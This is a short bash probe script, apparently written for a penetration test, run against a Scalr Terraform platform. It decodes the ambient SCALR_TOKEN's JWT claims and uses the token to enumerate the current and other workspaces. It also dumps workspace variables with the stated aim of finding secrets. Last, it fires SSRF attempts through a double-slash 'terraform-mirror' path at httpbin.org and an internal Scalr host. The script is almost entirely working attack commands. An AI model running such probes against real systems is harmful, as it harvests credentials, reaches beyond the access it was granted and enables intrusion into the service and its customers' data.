#!/usr/bin/env bash

echo "=== SCALR_TOKEN claims ==="
echo "$SCALR_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
raw = sys.stdin.read().strip()
pad = raw + '=' * (4 - len(raw) % 4)
try:
    decoded = base64.urlsafe_b64decode(pad)
    claims = json.loads(decoded)
    print(json.dumps(claims, indent=2))
except Exception as e:
    print('err:', e)
"

echo ""
echo "=== SCALR_TOKEN: access to current workspace ==="
curl -sk --max-time 5 \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID" \
  -H "Authorization: Bearer $SCALR_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('ws name:', d['data']['attributes'].get('name'), '| account:', d['data']['relationships'].get('account',{}).get('data',{}).get('id'))"

echo ""
echo "=== SCALR_TOKEN: can it read other workspaces? ==="
curl -sk --max-time 5 \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?query=&page[size]=10" \
  -H "Authorization: Bearer $SCALR_TOKEN" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin)
wss=d.get('data',[])
print('visible workspaces:', len(wss))
for w in wss: print(' -', w['id'], w['attributes'].get('name','?'))
"

echo ""
echo "=== SCALR_TOKEN: workspace variables (check for secrets) ==="
curl -sk --max-time 5 \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID/vars" \
  -H "Authorization: Bearer $SCALR_TOKEN" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin)
for v in d.get('data',[]):
    a=v['attributes']
    print(a.get('key'),'sensitive='+str(a.get('sensitive')),'value='+str(a.get('value'))[:30])
" 2>/dev/null || echo "no vars / denied"

echo ""
echo "=== C4 SSRF via mirror (double-slash path) ==="
curl -sk --max-time 8 --no-location -D - \
  "https://$SCALR_HOSTNAME/terraform-mirror//httpbin.org/status/200" \
  2>/dev/null | grep -E "^HTTP/|^Location:|^location:" | head -3

echo ""
echo "=== C4 SSRF via internal.main.scalr.dev mirror ==="
curl -sk --max-time 8 --no-location -D - \
  "https://internal.main.scalr.dev/terraform-mirror//httpbin.org/status/200" \
  2>/dev/null | grep -E "^HTTP/|^Location:|^location:" | head -3

echo "=== done ==="